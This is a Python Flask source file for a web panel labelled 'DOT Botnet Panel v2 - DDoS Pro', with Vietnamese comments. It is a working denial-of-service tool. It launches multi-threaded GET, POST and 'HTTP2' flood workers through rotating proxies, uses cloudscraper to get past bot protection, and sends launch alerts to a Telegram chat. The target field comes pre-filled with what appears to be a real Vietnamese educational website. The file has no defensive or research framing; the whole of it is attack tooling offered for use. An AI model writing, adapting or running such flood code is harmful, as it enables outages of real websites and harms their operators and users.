import os
import threading
import random
import time
from flask import Flask, request, jsonify
import telebot
import requests
import cloudscraper

app = Flask(__name__)

# ================== TELEGRAM FROM ENV ==================
TELE_TOKEN = os.getenv("TELE_TOKEN")
TELE_CHAT_ID = os.getenv("TELE_CHAT_ID")

tele_bot = telebot.TeleBot(TELE_TOKEN) if TELE_TOKEN else None

# ================== DISCORD TOKEN FILE ==================
DISCORD_TOKEN_FILE = "discord_token.txt"

def load_discord_token():
    if os.path.exists(DISCORD_TOKEN_FILE):
        with open(DISCORD_TOKEN_FILE, "r") as f:
            return f.read().strip()
    return "Chưa có Discord Token"

def save_discord_token(token):
    with open(DISCORD_TOKEN_FILE, "w") as f:
        f.write(token.strip())
    return "✅ Lưu Discord Token thành công!"

# ================== PROXY ROTATE (free list) ==================
PROXIES = [
    "http://103.211.26.94",   # thay bằng proxy live từ free-proxy-list.net
    "http://138.91.159.185",
    # thêm nhiều proxy nữa nếu có
]

def get_random_proxy():
    return random.choice(PROXIES) if PROXIES else None

# ================== FULL ATTACK METHODS (từ DOT style) ==================
def launch_attack(method, target, duration=60, threads=100):
    print(f"🔥 BẮT ĐẦU ATTACK {method} → {target} | {duration}s | {threads} threads")
    start_time = time.time()
    scraper = cloudscraper.create_scraper()

    def worker():
        while time.time() - start_time < duration:
            try:
                proxy = get_random_proxy()
                proxies = {"http": proxy, "https": proxy} if proxy else None
                
                if method == "GET":
                    scraper.get(target, timeout=5, proxies=proxies)
                elif method == "POST":
                    scraper.post(target, data={"test": "flood"}, timeout=5, proxies=proxies)
                elif method == "HTTP2":
                    requests.get(target, headers={"Upgrade": "h2c"}, timeout=5, proxies=proxies)
                else:  # default GET flood
                    requests.get(target, timeout=5, proxies=proxies)
                
                time.sleep(random.uniform(0.01, 0.1))  # tránh quá nhanh bị block
            except:
                pass

    # Start threads
    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()

    msg = f"🚀 ATTACK {method} on {target} ĐÃ BẮN! Duration: {duration}s | Threads: {threads}"
    if tele_bot and TELE_CHAT_ID:
        try:
            tele_bot.send_message(TELE_CHAT_ID, msg)
        except:
            pass
    return msg

# ================== WEB PANEL ==================
@app.route('/')
def index():
    discord_token = load_discord_token()
    tele_status = f"{TELE_TOKEN[:15]}..." if TELE_TOKEN else "❌ Chưa set TELE_TOKEN"
    
    return f'''
    <h1>🚀 DOT Botnet Panel v2 - DDoS Pro</h1>
    <h2>Telegram: <span style="color:green">{tele_status}</span></h2>
    
    <h3>Discord Token</h3>
    <form action="/save_discord" method="post">
        <input type="text" name="discord_token" style="width:500px" value="{discord_token}">
        <button type="submit">💾 SAVE</button>
    </form>
    
    <hr>
    <h3>🚀 LAUNCH ATTACK</h3>
    <form action="/attack" method="post">
        Method: 
        <select name="method">
            <option value="GET">GET Flood</option>
            <option value="POST">POST Flood</option>
            <option value="HTTP2">HTTP2</option>
        </select><br><br>
        
        Target: <input type="text" name="target" value="https://www.nvec.edu.vn" style="width:500px" required><br><br>
        Duration (giây): <input type="number" name="duration" value="120"><br><br>
        Threads: <input type="number" name="threads" value="150"><br><br>
        
        <button type="submit">🔥 BẮN NGAY</button>
    </form>
    '''

@app.route('/save_discord', methods=['POST'])
def save_discord():
    token = request.form.get('discord_token', '').strip()
    if token:
        return f"<h2>{save_discord_token(token)}</h2><br><a href='/'>← Quay lại</a>"
    return "Thiếu token!"

@app.route('/attack', methods=['POST'])
def attack():
    method = request.form.get('method')
    target = request.form.get('target')
    duration = int(request.form.get('duration', 60))
    threads = int(request.form.get('threads', 100))
    
    threading.Thread(target=launch_attack, args=(method, target, duration, threads), daemon=True).start()
    
    return jsonify({"status": "success", "message": f"Attack {method} on {target} đã bắn!"})

if __name__ == "__main__":
    print("🚀 DOT Botnet Panel v2 đang chạy như hacker phá web!")
    if tele_bot:
        threading.Thread(target=tele_bot.polling, daemon=True).start()
    app.run(host='0.0.0.0', port=5000)
